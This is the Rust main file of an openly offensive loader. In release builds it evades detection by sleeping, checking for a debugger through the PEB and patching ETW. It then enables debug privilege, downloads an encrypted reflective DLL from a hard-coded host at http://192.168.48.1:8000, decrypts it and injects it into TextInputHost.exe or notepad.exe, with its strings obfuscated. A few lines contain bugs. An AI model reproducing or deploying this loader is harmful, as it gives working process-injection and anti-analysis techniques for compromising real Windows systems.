// #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
#![allow(unused)]
#![allow(unreachable_code)]
#![allow(unused_unsafe)]


mod download;
mod parse_pe;
mod inject;
mod hwbp;
mod file;
mod nt_api;
mod debug_helper;
mod evasion;
mod reconnaissance;
mod handle_steal;
mod crypto;
use crate::debug_helper::*;

use obfuse::obfuse;
use clap::Parser;

use std::thread;
use std::time::Duration;


/// Inject ReflectiveDLL.dll into a target process.
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {

    /// Target process name (e.g., notepad.exe)
    #[arg(short, long)]
    process: String,

    // #[arg(short, long, conflicts_with = "url")]
    // file: Option<String>,

    // #[arg(short, long, conflicts_with = "file")]

    /// URL to download the DLL from (e.g., http://example.com/xxx.dll)
    #[arg(short, long)]
    url: Option<String>,

    /// yolo function name in xxx.dll
    #[arg(long, default_value = "yolo")]
    rflname: String
}


fn main() -> Result<(), anyhow::Error>{
    // let args = Args::parse();

    // let Some(url) = args.url else {
    //     eprintln!("[ERROR] --url must be provided.");
    //     std::process::exit(1);
    // };

    #[cfg(not(debug_assertions))]
    {
        for _i in 1..=3 {

            // Interleaving other behaviors to deceive heuristic scanning

            thread::sleep(Duration::from_secs(1));
        }

        let obfused_ip = obfuse!("192.168.48.1");
        let ip = obfused_ip.as_str();
        let common_ports = [80, 8000];


        let online = common_ports.iter().any(|&port| {
            reconnaissance::check_host_online(ip, port).is_ok()
        });
        
        if !online {
            return OK(());
        }
    }

    #[cfg(not(debug_assertions))]
    unsafe {

        if evasion::being_debugged_by_peb() {
            return;
        } 
        let _ = evasion::patch_etw().expect("[ERROR] Failed to patch E T W.");

    }

    nt_api::init_zw_api().expect("[ERROR] Failed to initialize ZW API!");

    let enabled_debug_privilege = match reconnaissance::enable_debug_privilege() {
        Ok(_) => {
            debug_println!("[INFO] Enabled Debug Priv");
            true
        }
        Err(e) => {
            debug_eprintln!("[WARNING] Enable Debug Priv failed\n{:#}", e);
            false
        }
    };


    let obfused_url = obfuse!("http://192.168.48.1:8000/ReflectiveDLL.dll");
    let url = obfused_url.as_str();


    let obfused_process = if enabled_debug_privilege {
        obfuse!("TextInputHost.exe")
    }
    else {
        obfuse!("notepad.exe")
    };


    // let obfused_process = obfuse!("typora.exe");
    let process = obfused_process.as_str();

    let obfused_rflname = obfuse!("yolo");
    let rflname = obfused_rflname.as_str();

    // for _i in 1..=10 {
    //     thread::sleep(Duration::from_secs(1));
    // }

    debug_println!("[INFO] Downloading from {}", url);

    let data = download::download_to_memory(url, None, None)
        .expect("Failed to download file");

    if !data.is_empty() {
        debug_println!("[INFO] Downloaded {} bytes", data.len());
    } else {
        debug_println!("[INFO] Downloaded empty file");
        return Ok(());
    }

    let dll_bytes = crypto::decrypt(&data)
    .expect("[ERROR] Failed to decrypt DLL");

    // ── Parse PE and find target PID via handle enumeration ───────────────
    let dll = parse_pe::PeFileParser::new(&dll_bytes);

    let func_raw = dll.get_func_raw(rflname).expect("[ERROR] Failed to find yolo function");
    debug_println!("[INFO] yolo raw offset: 0x{:X}", func_raw);


    inject::inject_dll_into_process(
        &process.encode_utf16().collect::<Vec<u16>>(),
        &dll,
        func_raw,
    ).expect("Failed to 1nject DLL!\n");

    
    Ok(())

}
